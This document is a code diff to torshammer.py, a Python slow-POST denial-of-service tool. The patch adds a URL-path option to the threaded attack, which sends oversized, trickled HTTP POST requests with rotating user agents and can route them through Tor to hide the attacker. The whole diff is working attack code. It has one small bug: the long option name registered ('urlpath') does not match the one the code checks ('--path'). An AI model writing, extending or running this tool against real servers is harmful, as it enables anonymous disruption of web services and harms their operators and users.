@@ -50,10 +50,11 @@ useragents = [
 ]
 
 class httpPost(Thread):
-    def __init__(self, host, port, tor):
+    def __init__(self, host, port, path, tor):
         Thread.__init__(self)
         self.host = host
         self.port = port
+        self.path = path
         self.socks = socks.socksocket()
         self.tor = tor
         self.running = True
@@ -61,14 +62,14 @@ class httpPost(Thread):
     def _send_http_post(self, pause=10):
         global stop_now
 
-        self.socks.send("POST / HTTP/1.1\r\n"
+        self.socks.send("POST %s HTTP/1.1\r\n"
                         "Host: %s\r\n"
                         "User-Agent: %s\r\n"
                         "Connection: keep-alive\r\n"
                         "Keep-Alive: 900\r\n"
                         "Content-Length: 10000\r\n"
                         "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
-                        (self.host, random.choice(useragents)))
+                        (self.path, self.host, random.choice(useragents)))
 
         for i in range(0, 9999):
             if stop_now:
@@ -113,6 +114,7 @@ def usage():
     print " -t|--target <Hostname|IP>"
     print " -r|--threads <Number of threads> Defaults to 256"
     print " -p|--port <Web Server Port> Defaults to 80"
+    print " -u|--urlpath <URL Path> Defaults to /"
     print " -T|--tor Enable anonymising through tor on 127.0.0.1:9050"
     print " -h|--help Shows this help\n" 
     print "Eg. ./torshammer.py -t 192.168.1.100 -r 256\n"
@@ -120,7 +122,8 @@ def usage():
 def main(argv):
     
     try:
-        opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
+        opts, args = getopt.getopt(argv, "hTt:r:p:u:", ["help", "tor",
+            "target=", "threads=", "port=", "urlpath="])
     except getopt.GetoptError:
         usage() 
         sys.exit(-1)
@@ -131,6 +134,7 @@ def main(argv):
     threads = 256
     tor = False
     port = 80
+    path = '/'
 
     for o, a in opts:
         if o in ("-h", "--help"):
@@ -144,6 +148,8 @@ def main(argv):
             threads = int(a)
         elif o in ("-p", "--port"):
             port = int(a)
+        elif o in ("-u","--path"):
+            path = a
 
     if target == '' or int(threads) <= 0:
         usage()
@@ -157,7 +163,7 @@ def main(argv):
 
     rthreads = []
     for i in range(threads):
-        t = httpPost(target, port, tor)
+        t = httpPost(target, port, path, tor)
         rthreads.append(t)
         t.start()
 
